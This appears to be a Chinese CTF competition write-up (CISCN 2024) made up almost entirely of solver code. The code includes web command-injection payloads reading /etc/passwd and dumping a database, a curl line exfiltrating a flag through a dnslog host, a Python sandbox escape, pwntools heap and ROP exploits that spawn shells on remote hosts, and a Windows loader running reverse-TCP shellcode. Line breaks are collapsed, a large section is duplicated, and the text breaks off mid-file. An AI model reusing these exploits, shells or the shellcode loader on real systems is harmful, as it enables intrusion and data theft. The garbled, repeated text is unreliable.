# UKFC2024 CISCN国赛WP

> 原文: https://www.ctfiot.com/182308.html
> ID: 182308

为积极响应国家网络空间安全人才战略，加快攻防兼备创新人才培养步伐，实现以赛促学、以赛促教、以赛促用，推动网络空间安全人才培养和产学研用生态发展，由中国互联网发展基金会网络安全专项基金资助，四川大学承办的第十七届全国大学生信息安全竞赛——创新实践能力赛将于2024年4月至2024年7月举行，面向全‍国高校在校生开放。

cmd=paste /etc/passwd

cmd=php+-r+system(hex2bin(substr(a6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27,1)));
#mysql -u root -p'root' -e 'select * from PHP_CMS.F1ag_Se3Re7;'

https://requestrepo.com/#/edit-response

http://127.0.0.1/flag.php?cmd=curl+`/readflag`.dnslog

url/?s=api&c=api&m=qrcode&thumb=http://刚刚生成的url&text=1&size=2&level=1

https://requestrepo.com/#/edit-response

def exp(): def gen_frame(): yield g.gi_frame.f_back g = gen_frame() frame=[x for x in g][0]

https://jbnrz.com.cn/index.php/2024/02/16/l3hctf-2024/

builtins = frame.f_back.f_back.f_back.f_globals['_''___builtins___''_']

if "THIS_IS_SEED" in output: print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！") print("bad code-operation why still happened ah?") else: print(output)

def exp(): def gen_frame(): yield g.gi_frame.f_back g = gen_frame() frame=[x for x in g][0] print(frame.f_back) builtins = frame.f_back.f_back.f_back.f_globals['_''___builtins___''_'] code = frame.f_back.f_back.f_back.f_code for constant in builtins.str(code.co_consts): print(constant,end=" ")exp()

from pwn import *context(log_level='debug',arch='amd64',os='linux')
#io=process('./gostack')io=remote('8.147.128.251',14970)
padding=0x1d0mov_rdi_v_rax_ret=0x460cd8pop_rdi_5_ret=0x4a18a5pop_rax_ret=0x40f984pop_rdx_ret=0x4944ecpop_rsi_ret=0x42138abss=0x563720syscall=0x404043
payload1=b'a'*0x1d0
io.recvuntil('Input your magic message :')
payload=flat(b'x00'*0x1d0,pop_rdi_5_ret,bss,0,0,0,0,0,pop_rax_ret,b'/bin/shx00',mov_rdi_v_rax_ret)payload+=flat(pop_rdi_5_ret,bss,0,0,0,0,0,pop_rsi_ret,0,pop_rdx_ret,0,pop_rax_ret,0x3b,syscall)#gdb.attach(io)#pause()io.sendline(payload)
io.interactive()

from pwn import *context(log_level='debug',arch='amd64',os='linux')
#io=process('./orange_cat_diary')libc=ELF('./ciscnlibc2.23.so')io=remote('8.147.128.96',38377)
io.sendline(b'qwq')menu=b'Please input your choice:'
def add(size,content): io.recvuntil(menu) io.sendline(b'1') io.recvuntil(b'the diary content:') io.sendline(str(size)) io.recvuntil(b'the diary content:n') io.send(content)
def dump(): io.recvuntil(menu) io.sendline(b'2')
def delete(): io.recvuntil(menu) io.sendline(b'3')
def edit(size,content): io.recvuntil(menu) io.sendline(b'4') io.recvuntil(b'length of the diary content:') io.sendline(str(size)) io.recvuntil(b'the diary content:') io.send(content)
add(0x18,b'a'*8)payload=flat(b'a'*0x18,0xfe1)edit(0x20,payload)add(0x1000,b'a'*0x10)add(0x68,b'a'*0x8)delete()dump()
io.recvuntil(b'x00'*8)target=u64(io.recv(6).ljust(8,b'x00'))-0x69blibc_base=target-0x3c4aed#-libc.sym['__malloc_hook']-print('target',hex(target))edit(0x20,p64(target)+p64(target))#gdb.attach(io)add(0x68,b'x00'*0x23)
one=[0x45226,0x4527a,0xf03a4,0xf1247]add(0x68,b'x00'*0x3+p64(one[2]+libc_base)*10)
io.recvuntil(menu)io.sendline(b'1')io.sendline(b'99')
io.interactive()

unsigned int64 edit(){ unsigned int v1; // [rsp+0h] [rbp-10h] BYREF unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF unsigned int64 v3; // [rsp+8h] [rbp-8h] v3 = readfsqword(0x28u); printf("idx:"); isoc99_scanf("%d", &v1); if ( v1 > 0x4F || !*((_QWORD *)&unk_4060 + (int)v1) ) { puts("error!"); exit(0); } printf("size:"); isoc99_scanf("%d", &v2); if ( v2 >= 0x501 ) { puts("error"); exit(0); } printf("content:"); read(0, *((void **)&unk_4060 + (int)v1), (int)v2); return v3 - readfsqword(0x28u);}

from pwn import *context(log_level='debug',arch='amd64',os='linux')
menu=b'choice >> 'libc=ELF('./libc.so.6')io=process('./EzHeap')
def add(size,content): io.recvuntil(menu) io.sendline(b'1') io.recvuntil(b'size:') io.sendline(str(size)) io.recvuntil(b'content:') io.send(content) def delete(idx): io.recvuntil(menu) io.sendline(b'2') io.recvuntil(b'idx:') io.sendline(str(idx))
def edit(idx,size,content): io.recvuntil(menu) io.sendline(b'3') io.recvuntil(b'idx:') io.sendline(str(idx)) io.recvuntil(b'size:') io.sendline(str(size)) io.recvuntil(b'content:') io.send(content)
def dump(idx): io.recvuntil(menu) io.sendline(b'4') io.recvuntil(b'idx') io.sendline(str(idx))
add(0x420,'Justice')add(0x430,'Uphold')add(0x420,'QAQ')
delete(1)edit(0,0x430,b'a'*0x430)dump(0)io.recvuntil(b'a'*0x430)libc_base=u64(io.recv(6).ljust(8,b'x00'))-0x21ace0print('libc_base:',hex(libc_base))
edit(0,0x430,flat(b'a'*0x420,0,0x441))add(0x490,b'YanQimeng')edit(0,0x440,b'a'*0x440)dump(0)io.recvuntil(b'a'*0x440)heap=u64(io.recv(6).ljust(8,b'x00'))print('heap:',hex(heap))
payload=b'a'*0x420+p64(0)+p64(0x441)#gdb.attach(io)edit(0,0x430,payload)
io_list_all=libc_base+libc.sym['_IO_list_all']mprotect=libc_base+libc.sym['mprotect']
wfile=libc_base+libc.sym['_IO_wfile_jumps']lock=libc_base+(0x7fc55e21ca60-0x7fc55e000000)
addr0=heap+0x290addr2=heap+0x13c0target=addr0+0xe0+0xe8+0x70magic=0x0000000000167420+libc_basepop_rdi_ret=0x000000000002a3e5+libc_basepop_rsi_ret=0x000000000002be51+libc_basepop_rdx_r12_ret=0x000000000011f2e7+libc_baseset_context=libc_base+libc.sym['setcontext']+61heap=0x11c0+heappayload=flat(0,0,0,io_list_all-0x20)payload+=flat(0,0,0,target)payload+=p64(0)*7payload+=flat(lock,0,0,heap+0xe0)payload+=p64(0)*6payload+=p64(wfile)payload+=p64(0)*0x1cpayload+=p64(heap+0x1c8)payload+=p64(0)*0xd
payload+=p64(magic)
add(0x4a0,b' ')add(0x480,payload)delete(1)add(0x500,b'aaaaaaaa')delete(4)payload=flat(b'a'*0x420,0,0x4a1,0,0,0,io_list_all-0x20)edit(2,0x450,payload)add(0x500,b'a')
payload=flat({ 0x00:'./flagx00', 0x20:p64(set_context), 0xa0:p64(heap-0x4a0+0xb8), 0xa8:p64(pop_rdi_ret), 0xb8:p64(heap-0x4a0), 0xc0:p64(pop_rsi_ret), 0xc8:p64(0x8000), 0xd0:p64(pop_rdx_r12_ret), 0xd8:p64(7), 0xe8:p64(pop_rdi_ret), 0xf0:p64(heap&0xfffffffff000), 0xf8:p64(mprotect), 0x100:p64(heap-0x4a0+0x108)})payload+=asm(shellcraft.open('./flag'))payload+=asm(shellcraft.read(3,'rsp',0x50))payload+=asm(shellcraft.write(1,'rsp',0x50))payload=payload.ljust(0x4a0,b'x00')payload+=flat(0,heap-0x4a0,0,0,0,io_list_all-0x20)#gdb.attach(io)edit(3,0x500,payload)

io.interactive()

n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
k = e//n-2
R.<x> = PolynomialRing(RealField(1024))temp = 65537 + (k+2)*n + (e//n) + 1temp = e*x-(2*(k+1)*x^2+(k+2)*n +temp*x)res = temp.roots()print(res)
for i in res: p = int(i[0]) R.<x> = PolynomialRing(Zmod(n)) m = p + x M = m.monic().small_roots(X=2 ^ 200,beta = 0.4) if M: pp = int(M[0])+p qq = n //pp print(pp) print(qq) e = 65537 + k * pp + (k+2) * ((pp+1) * (qq+1)) + 1 print(e)

from Crypto.Util.number import inverse, long_to_bytes
n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
pp = 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091qq = 11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226053225696381145049303216018329937626866082580192534109310743249d = inverse(e,(pp-1)*(qq-1))print(long_to_bytes(pow(c,d,n)))# b'flag{b5f771c6-18df-49a9-9d6d-ee7804f5416c}'

#include <stdio.h>
char flag[]="flag{11111111111111111111111111111111}";unsigned char a[] ={ 0xBF, 0x63, 0x79, 0xDA, 0xBC, 0x27, 0xB0, 0x8F, 0xC9, 0x7B, 0x54, 0xC3, 0x6C, 0x9A, 0x1A, 0x02, 0xE5, 0x94, 0x56, 0xA9, 0xAE, 0x4F, 0x1A, 0x6C, 0xF3, 0x9E, 0xBF, 0x0B, 0x7D, 0x94, 0x44, 0x14, 0x85, 0xBC, 0xD2, 0x4A, 0x92, 0x19,};unsigned char index[] ={ 0x12, 0x0E, 0x1B, 0x1E, 0x11, 0x05, 0x07, 0x01, 0x10, 0x22, 0x06, 0x17, 0x16, 0x08, 0x19, 0x13, 0x04, 0x0F, 0x02, 0x0D, 0x25, 0x0C, 0x03, 0x15, 0x1C, 0x14, 0x0B, 0x1A, 0x18, 0x09, 0x1D, 0x23, 0x1F, 0x20, 0x24, 0x0A, 0x0 , 0x21};
unsigned char c[] ={ 0x56, 0x1A, 0x0B, 0x44, 0x94, 0x27, 0x8F, 0x63, 0xE5, 0xD2, 0xB0, 0x6C, 0x1A, 0xC9, 0x9E, 0xA9, 0xBC, 0x02, 0x79, 0x9A, 0x19, 0x6C, 0xDA, 0x4F, 0x7D, 0xAE, 0xC3, 0xBF, 0xF3, 0x7B, 0x94, 0x4A, 0x14, 0x85, 0x92, 0x54, 0xBF, 0xBC};unsigned char d[] ={ 136, 176, 73, 184, 157, 207, 61, 101, 232, 65, 209, 152, 62, 128, 139, 168, 107, 169, 125, 130, 214, 133, 15, 217, 78, 100, 58, 149, 173, 145, 185, 118, 128, 234, 170, 201, 231, 86,};unsigned char e[] ={ 191, 215, 46, 218, 238, 168, 26, 16, 131, 115, 172, 241, 6, 190, 173, 136, 4, 215, 18, 254, 181, 226, 97, 183, 61, 7, 74, 232, 150, 162, 157, 77, 188, 129, 140, 233, 136, 120, };int main(){ char enc[]="congratulationstoyoucongratulationstoy"; char tmp[38]; for(int i=0;i<38;i++) { enc[i]^=d[i]^c[i]^e[i]; tmp[index[i]]=enc[i];
 } for(int i=0;i<38;i++) { printf("%c",tmp[i]^a[i]^flag[i]);
 }
return 0;}

NAME whereThel1bFUNCTIONS check_flag(flag) -> 'bool' trytry(pla) whereistheflag(pla) whereistheflag1(pla) whereistheflag2(pla) whereistheflag3(pla) whereistheflag4(pla) whereistheflag5(pla) whereistheflag6(pla)
DATA __test__ = {} encry = [86, 96, 121, 96, 74, 60, 120, 57, 85, 83, 72, 32, 98, 88, 57,...
FILE /home/shimmer/whereThel1b.so

import base64import random
random.seed(0)encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
for i in range(56): temp = random.randint(0,56) encry[i] ^= temp #print(chr(encry[i]),end='')print(base64.b64decode('ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9'.encode()))# flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}

public class inspect { public static boolean inspect(String input_str) { try { byte[] input_flag = input_str.getBytes(StandardCharsets.UTF_8); byte[] str2 = jni.getkey().getBytes(StandardCharsets.UTF_8); Arrays.copyOf(str2, 8); SecretKeySpec key = new SecretKeySpec(str2, "AES"); byte[] ivBytes = jni.getiv().getBytes(StandardCharsets.UTF_8); IvParameterSpec iv = new IvParameterSpec(ivBytes); Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding"); cipher.init(1, key, iv); byte[] encryptedBytes = cipher.doFinal(input_flag); String encryptedFlag = Base64.encodeToString(encryptedBytes, 0).trim(); boolean bool = encryptedFlag.equals("JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw=="); if (!bool) { return true; } return false; } catch (Exception exception) { exception.printStackTrace(); return true; } }}

#include <stdio.h>int res[] = {0xD7,0x1F,0,0,0xB7,0x21,0,0,0x47,0x1E,0,0,0x27,0x20,0,0,0xE7,0x26,0,0,0xD7,0x10,0,0,0x27,0x11,0,0,7,0x20,0,0,0xC7,0x11,0,0,0x47,0x1E,0,0,0x17,0x10,0,0,0x17,0x10,0,0,0xF7,0x11,0,0,7,0x20,0,0,0x37,0x10,0,0,7,0x11,0,0,0x17,0x1F,0,0,0xD7,0x10,0,0,0x17,0x10,0,0,0x17,0x10,0,0,0x67,0x1F,0,0,0x17,0x10,0,0,0xC7,0x11,0,0,0xC7,0x11,0,0,0x17,0x10,0,0,0xD7,0x1F,0,0,0x17,0x1F,0,0,7,0x11,0,0,0x47,0xF,0,0,0x27,0x11,0,0,0x37,0x10,0,0,0x47,0x1E,0,0,0x37,0x10,0,0,0xD7,0x1F,0,0,7,0x11,0,0,0xD7,0x1F,0,0,7,0x11,0,0,0x87,0x27,0,0,};int main(){ for (int i = 0; i < 200; i+=4) { int aa = res[i] | (res[i + 1] << 8); aa -= 0x1e; aa ^= 0x4d; aa -= 0x14; aa /= 0x50; printf("%c", aa); } return 0;}

import numpyf = 'attachment.npz'data = numpy.load(f)arr1,arr2,arr3,arr4 = data['index'],data['input'],data['output'],data['trace']#print(arr1,arr2,arr3,arr4,sep='n')s = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '!', '@', '#']print(len(s))print(len(arr4))
l = []for i in range(0,520,40): maxn = -1 maxindex = 0 init = i gr = arr4[i:i+40] for j in range(0,40): zhu = gr[j] sumn = 0 for k in range(0,40): if k == j: continue fu = gr[k] sumn += numpy.mean((zhu-fu)**2) temp = sumn / 39 if temp >maxn: maxn = temp maxindex = i+j l.append(maxindex)print(l)
key = [36, 42, 88, 138, 162, 213, 276, 308, 346, 388, 430, 476, 494]
print(s[key[0]])print(s[key[1]%40])print(s[key[2]%40])for i in key: print(s[i%40],end='')

Line #0: FuncDefn (Sub crypto(sMessage, strKey))Line #1: Dim VarDefn kLen VarDefn x VarDefn y VarDefn i VarDefn j VarDefn tempLine #2:... NextLine #38: QuoteRem 0x0004 0x0026 "i13POMdzEAzHfy4dGS+vUA==(After base64)"Line #39: EndSub

Vm1wR1UxRXhXWGhUV0d4WFlrZG9WMWxVUm1GWFJscHlWMjVrVmxKc2NIaFZiVFZQVkd4S2MxSnFVbGRXTTFKUVdWVmtVMDVyTVVWaGVqQTk=N round Base64

from PIL import ImageMAX = 21pic = Image.new("RGB",(MAX, MAX))str = "111111101100101111111100000100100101000001101110101010101011101101110101001001011101101110101110001011101100000100000001000001111111101010101111111000000000110000000000111100101010010011101010010000010110111111011001111000101100001001110000110100001000000101111001001100000000000001111001110010111111100100011010110100000100011010000100101110100001000010110101110101110110100110101110101011110101100100000101110001111001111111101111001111100"i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save("flag.png")

from pwn import *import requests as rq
url='http://8.147.128.251:18772/'for i in range(0x10000): print(i) padding='x61'*(i*4) payload=padding+'static/1' rq.get(url+'upload?name='+payload) rq.get(url+'test') res=rq.get(url+'static/1') print(res.text)

import numpy as npfrom PIL import Imageimport struct
img = Image.open('1.png')img = img.convert('RGBA')
data = np.array(img.getdata(),dtype = np.uint8)lenth = struct.unpack('<I',bytearray(data[0:8:2,0]))[0]
extract = bytearray(data[8:8 + (lenth * 2):2,0])
print(extract)
with open('666','wb') as f: f.write(extract)

#include <iostream>#include <stdio.h>#include <string.h>#include <Windows.h>
int main(){ unsigned char program[] = "xfcx48x83xe4xf0xe8xccx00x00x00x41x51x41x50x52x48x31xd2x65x48x8bx52x60x51x56x48x8bx52x18x48x8bx52x20x48x0fxb7x4ax4ax4dx31xc9x48x8bx72x50x48x31xc0xacx3cx61x7cx02x2cx20x41xc1xc9x0dx41x01xc1xe2xedx52x41x51x48x8bx52x20x8bx42x3cx48x01xd0x66x81x78x18x0bx02x0fx85x72x00x00x00x8bx80x88x00x00x00x48x85xc0x74x67x48x01xd0x50x8bx48x18x44x8bx40x20x49x01xd0xe3x56x48xffxc9x4dx31xc9x41x8bx34x88x48x01xd6x48x31xc0xacx41xc1xc9x0dx41x01xc1x38xe0x75xf1x4cx03x4cx24x08x45x39xd1x75xd8x58x44x8bx40x24x49x01xd0x66x41x8bx0cx48x44x8bx40x1cx49x01xd0x41x8bx04x88x41x58x41x58x5ex48x01xd0x59x5ax41x58x41x59x41x5ax48x83xecx20x41x52xffxe0x58x41x59x5ax48x8bx12xe9x4bxffxffxffx5dx49xbex77x73x32x5fx33x32x00x00x41x56x49x89xe6x48x81xecxa0x01x00x00x49x89xe5x49xbcx02x00x20xfbx27x64x48xebx41x54x49x89xe4x4cx89xf1x41xbax4cx77x26x07xffxd5x4cx89xeax68x01x01x00x00x59x41xbax29x80x6bx00xffxd5x6ax0ax41x5ex50x50x4dx31xc9x4dx31xc0x48xffxc0x48x89xc2x48xffxc0x48x89xc1x41xbaxeax0fxdfxe0xffxd5x48x89xc7x6ax10x41x58x4cx89xe2x48x89xf9x41xbax99xa5x74x61xffxd5x85xc0x74x0ax49xffxcex75xe5xe8x93x00x00x00x48x83xecx10x48x89xe2x4dx31xc9x6ax04x41x58x48x89xf9x41xbax02xd9xc8x5fxffxd5x83xf8x00x7ex55x48x83xc4x20x5ex89xf6x6ax40x41x59x68x00x10x00x00x41x58x48x89xf2x48x31xc9x41xbax58xa4x53xe5xffxd5x48x89xc3x49x89xc7x4dx31xc9x49x89xf0x48x89xdax48x89xf9x41xbax02xd9xc8x5fxffxd5x83xf8x00x7dx28x58x41x57x59x68x00x40x00x00x41x58x6ax00x5ax41xbax0bx2fx0fx30xffxd5x57x59x41xbax75x6ex4dx61xffxd5x49xffxcexe9x3cxffxffxffx48x01xc3x48x29xc6x48x85xf6x75xb4x41xffxe7x58x6ax00x59xbbxe0x1dx2ax0ax41x89xdaxffxd5";
 size_t lenth = sizeof(program) - 1; void* exec = VirtualAlloc(0, lenth, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (exec = NULL) { printf("12345"); } memcpy(exec, program, lenth);
 ((void(*)())exec)();
 return 0;}


```
cmd=paste /etc/passwd
```



```
cmd=php+-r+system(hex2bin(substr(a6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27,1)));
#mysql -u root -p'root' -e 'select * from PHP_CMS.F1ag_Se3Re7;'
```



```
url/?s=api&c=api&m=qrcode&thumb=http://刚刚生成的url&text=1&size=2&level=1
```



```
def exp(): def gen_frame(): yield g.gi_frame.f_back g = gen_frame() frame=[x for x in g][0]
```



```
builtins = frame.f_back.f_back.f_back.f_globals['_''___builtins___''_']
```



```
if "THIS_IS_SEED" in output: print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！") print("bad code-operation why still happened ah?") else: print(output)
```



```
def exp(): def gen_frame(): yield g.gi_frame.f_back g = gen_frame() frame=[x for x in g][0] print(frame.f_back) builtins = frame.f_back.f_back.f_back.f_globals['_''___builtins___''_'] code = frame.f_back.f_back.f_back.f_code for constant in builtins.str(code.co_consts): print(constant,end=" ")exp()
```



```
from pwn import *context(log_level='debug',arch='amd64',os='linux')
#io=process('./gostack')io=remote('8.147.128.251',14970)
padding=0x1d0mov_rdi_v_rax_ret=0x460cd8pop_rdi_5_ret=0x4a18a5pop_rax_ret=0x40f984pop_rdx_ret=0x4944ecpop_rsi_ret=0x42138abss=0x563720syscall=0x404043
payload1=b'a'*0x1d0
io.recvuntil('Input your magic message :')
payload=flat(b'x00'*0x1d0,pop_rdi_5_ret,bss,0,0,0,0,0,pop_rax_ret,b'/bin/shx00',mov_rdi_v_rax_ret)payload+=flat(pop_rdi_5_ret,bss,0,0,0,0,0,pop_rsi_ret,0,pop_rdx_ret,0,pop_rax_ret,0x3b,syscall)#gdb.attach(io)#pause()io.sendline(payload)
io.interactive()
```



```
from pwn import *context(log_level='debug',arch='amd64',os='linux')
#io=process('./orange_cat_diary')libc=ELF('./ciscnlibc2.23.so')io=remote('8.147.128.96',38377)
io.sendline(b'qwq')menu=b'Please input your choice:'
def add(size,content): io.recvuntil(menu) io.sendline(b'1') io.recvuntil(b'the diary content:') io.sendline(str(size)) io.recvuntil(b'the diary content:n') io.send(content)
def dump(): io.recvuntil(menu) io.sendline(b'2')
def delete(): io.recvuntil(menu) io.sendline(b'3')
def edit(size,content): io.recvuntil(menu) io.sendline(b'4') io.recvuntil(b'length of the diary content:') io.sendline(str(size)) io.recvuntil(b'the diary content:') io.send(content)
add(0x18,b'a'*8)payload=flat(b'a'*0x18,0xfe1)edit(0x20,payload)add(0x1000,b'a'*0x10)add(0x68,b'a'*0x8)delete()dump()
io.recvuntil(b'x00'*8)target=u64(io.recv(6).ljust(8,b'x00'))-0x69blibc_base=target-0x3c4aed#-libc.sym['__malloc_hook']-print('target',hex(target))edit(0x20,p64(target)+p64(target))#gdb.attach(io)add(0x68,b'x00'*0x23)
one=[0x45226,0x4527a,0xf03a4,0xf1247]add(0x68,b'x00'*0x3+p64(one[2]+libc_base)*10)
io.recvuntil(menu)io.sendline(b'1')io.sendline(b'99')
io.interactive()
```



```
unsigned int64 edit(){ unsigned int v1; // [rsp+0h] [rbp-10h] BYREF unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF unsigned int64 v3; // [rsp+8h] [rbp-8h] v3 = readfsqword(0x28u); printf("idx:"); isoc99_scanf("%d", &v1); if ( v1 > 0x4F || !*((_QWORD *)&unk_4060 + (int)v1) ) { puts("error!"); exit(0); } printf("size:"); isoc99_scanf("%d", &v2); if ( v2 >= 0x501 ) { puts("error"); exit(0); } printf("content:"); read(0, *((void **)&unk_4060 + (int)v1), (int)v2); return v3 - readfsqword(0x28u);}
```



```
from pwn import *context(log_level='debug',arch='amd64',os='linux')
menu=b'choice >> 'libc=ELF('./libc.so.6')io=process('./EzHeap')
def add(size,content): io.recvuntil(menu) io.sendline(b'1') io.recvuntil(b'size:') io.sendline(str(size)) io.recvuntil(b'content:') io.send(content) def delete(idx): io.recvuntil(menu) io.sendline(b'2') io.recvuntil(b'idx:') io.sendline(str(idx))
def edit(idx,size,content): io.recvuntil(menu) io.sendline(b'3') io.recvuntil(b'idx:') io.sendline(str(idx)) io.recvuntil(b'size:') io.sendline(str(size)) io.recvuntil(b'content:') io.send(content)
def dump(idx): io.recvuntil(menu) io.sendline(b'4') io.recvuntil(b'idx') io.sendline(str(idx))
add(0x420,'Justice')add(0x430,'Uphold')add(0x420,'QAQ')
delete(1)edit(0,0x430,b'a'*0x430)dump(0)io.recvuntil(b'a'*0x430)libc_base=u64(io.recv(6).ljust(8,b'x00'))-0x21ace0print('libc_base:',hex(libc_base))
edit(0,0x430,flat(b'a'*0x420,0,0x441))add(0x490,b'YanQimeng')edit(0,0x440,b'a'*0x440)dump(0)io.recvuntil(b'a'*0x440)heap=u64(io.recv(6).ljust(8,b'x00'))print('heap:',hex(heap))
payload=b'a'*0x420+p64(0)+p64(0x441)#gdb.attach(io)edit(0,0x430,payload)
io_list_all=libc_base+libc.sym['_IO_list_all']mprotect=libc_base+libc.sym['mprotect']
wfile=libc_base+libc.sym['_IO_wfile_jumps']lock=libc_base+(0x7fc55e21ca60-0x7fc55e000000)
addr0=heap+0x290addr2=heap+0x13c0target=addr0+0xe0+0xe8+0x70magic=0x0000000000167420+libc_basepop_rdi_ret=0x000000000002a3e5+libc_basepop_rsi_ret=0x000000000002be51+libc_basepop_rdx_r12_ret=0x000000000011f2e7+libc_baseset_context=libc_base+libc.sym['setcontext']+61heap=0x11c0+heappayload=flat(0,0,0,io_list_all-0x20)payload+=flat(0,0,0,target)payload+=p64(0)*7payload+=flat(lock,0,0,heap+0xe0)payload+=p64(0)*6payload+=p64(wfile)payload+=p64(0)*0x1cpayload+=p64(heap+0x1c8)payload+=p64(0)*0xd
payload+=p64(magic)
add(0x4a0,b' ')add(0x480,payload)delete(1)add(0x500,b'aaaaaaaa')delete(4)payload=flat(b'a'*0x420,0,0x4a1,0,0,0,io_list_all-0x20)edit(2,0x450,payload)add(0x500,b'a')
payload=flat({ 0x00:'./flagx00', 0x20:p64(set_context), 0xa0:p64(heap-0x4a0+0xb8), 0xa8:p64(pop_rdi_ret), 0xb8:p64(heap-0x4a0), 0xc0:p64(pop_rsi_ret), 0xc8:p64(0x8000), 0xd0:p64(pop_rdx_r12_ret), 0xd8:p64(7), 0xe8:p64(pop_rdi_ret), 0xf0:p64(heap&0xfffffffff000), 0xf8:p64(mprotect), 0x100:p64(heap-0x4a0+0x108)})payload+=asm(shellcraft.open('./flag'))payload+=asm(shellcraft.read(3,'rsp',0x50))payload+=asm(shellcraft.write(1,'rsp',0x50))payload=payload.ljust(0x4a0,b'x00')payload+=flat(0,heap-0x4a0,0,0,0,io_list_all-0x20)#gdb.attach(io)edit(3,0x500,payload)

io.interactive()
```



```
n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
k = e//n-2
R.<x> = PolynomialRing(RealField(1024))temp = 65537 + (k+2)*n + (e//n) + 1temp = e*x-(2*(k+1)*x^2+(k+2)*n +temp*x)res = temp.roots()print(res)
for i in res: p = int(i[0]) R.<x> = PolynomialRing(Zmod(n)) m = p + x M = m.monic().small_roots(X=2 ^ 200,beta = 0.4) if M: pp = int(M[0])+p qq = n //pp print(pp) print(qq) e = 65537 + k * pp + (k+2) * ((pp+1) * (qq+1)) + 1 print(e)
```



```
from Crypto.Util.number import inverse, long_to_bytes
n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
pp = 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091qq = 11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226053225696381145049303216018329937626866082580192534109310743249d = inverse(e,(pp-1)*(qq-1))print(long_to_bytes(pow(c,d,n)))# b'flag{b5f771c6-18df-49a9-9d6d-ee7804f5416c}'
```



```
#include <stdio.h>
